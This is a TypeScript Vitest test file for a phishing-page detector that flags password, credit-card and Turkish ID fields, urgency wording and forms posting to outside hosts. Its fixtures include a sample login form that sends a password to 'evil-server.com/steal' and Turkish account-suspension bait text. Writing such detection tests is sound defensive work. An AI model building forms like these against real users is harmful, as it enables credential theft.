import { describe, it, expect } from "vitest";
import { analyzePage } from "@/detector/page-analyzer";
import t from "@/i18n/tr";
import { JSDOM } from "jsdom";

function createDocument(html: string): Document {
  const dom = new JSDOM(html);
  return dom.window.document;
}

describe("analyzePage", () => {
  it("should detect password fields", () => {
    const doc = createDocument(`
      <form>
        <input type="text" name="username" />
        <input type="password" name="password" />
      </form>
    `);
    const result = analyzePage(doc, "example.com");
    expect(result.hasPasswordField).toBe(true);
    expect(result.hasLoginForm).toBe(true);
  });

  it("should detect credit card fields by name", () => {
    const doc = createDocument(`
      <form>
        <input type="text" name="card_number" />
        <input type="text" name="cvv" />
      </form>
    `);
    const result = analyzePage(doc, "example.com");
    expect(result.hasCreditCardField).toBe(true);
    expect(result.reasons).toContain(t.analysis.creditCardRequested);
  });

  it("should detect credit card fields by Turkish placeholder", () => {
    const doc = createDocument(`
      <form>
        <input type="text" placeholder="Kredi Kart Numarasi" />
      </form>
    `);
    const result = analyzePage(doc, "example.com");
    expect(result.hasCreditCardField).toBe(true);
  });

  it("should detect external form actions", () => {
    const doc = createDocument(`
      <form action="https://evil-server.com/steal">
        <input type="password" />
      </form>
    `);
    const result = analyzePage(doc, "example.com");
    expect(result.suspiciousFormAction).toBe(true);
    expect(result.externalFormAction).toBe("evil-server.com");
    expect(result.score).toBeGreaterThanOrEqual(30);
  });

  it("should dedupe multiple forms posting to the same external host", () => {
    const doc = createDocument(`
      <form action="https://admin.shopify.com/a"><input type="text" /></form>
      <form action="https://admin.shopify.com/b"><input type="text" /></form>
      <form action="https://admin.shopify.com/c"><input type="text" /></form>
    `);
    const result = analyzePage(doc, "shopify.com");
    const formReasons = result.reasons.filter((r) =>
      r.includes("Form verisi farklı sunucuya gönderiliyor"),
    );
    expect(formReasons).toHaveLength(1);
    expect(formReasons[0]).toContain("admin.shopify.com");
    expect(formReasons[0]).toContain("(3 form)");
    // Score counted once per unique host, not per form.
    expect(result.score).toBe(30);
  });

  it("should list distinct external hosts separately", () => {
    const doc = createDocument(`
      <form action="https://a.example.org/x"><input /></form>
      <form action="https://a.example.org/y"><input /></form>
      <form action="https://b.example.org/z"><input /></form>
    `);
    const result = analyzePage(doc, "site.com");
    const formReasons = result.reasons.filter((r) =>
      r.includes("Form verisi farklı sunucuya gönderiliyor"),
    );
    expect(formReasons).toHaveLength(2);
    expect(formReasons.some((r) => r.includes("a.example.org") && r.includes("(2 form)"))).toBe(true);
    expect(formReasons.some((r) => r.includes("b.example.org") && !r.includes("form)"))).toBe(true);
  });

  it("should not flag same-domain form actions", () => {
    const doc = createDocument(`
      <form action="https://example.com/login">
        <input type="password" />
      </form>
    `);
    const result = analyzePage(doc, "example.com");
    expect(result.suspiciousFormAction).toBe(false);
  });

  it("should detect TC Kimlik with sensitive fields", () => {
    const doc = createDocument(`
      <div>TC Kimlik numaranizi girin</div>
      <form>
        <input type="text" name="tckn" />
        <input type="password" name="sifre" />
      </form>
    `);
    const result = analyzePage(doc, "evil.com");
    expect(result.reasons.some((r) => r.includes("TC Kimlik"))).toBe(true);
  });

  it("should detect urgency language", () => {
    const doc = createDocument(`
      <div>Hesabiniz askiya alindi! Hemen giris yapin ve dogrulayin.</div>
      <form><input type="password" /></form>
    `);
    const result = analyzePage(doc, "evil.com");
    expect(result.reasons.some((r) => r.includes("Aciliyet"))).toBe(true);
  });

  it("should return low score for benign pages", () => {
    const doc = createDocument(`
      <h1>Hosgeldiniz</h1>
      <p>Bu normal bir sayfa</p>
    `);
    const result = analyzePage(doc, "safe.com");
    expect(result.score).toBe(0);
    expect(result.hasLoginForm).toBe(false);
    expect(result.hasPasswordField).toBe(false);
  });
});
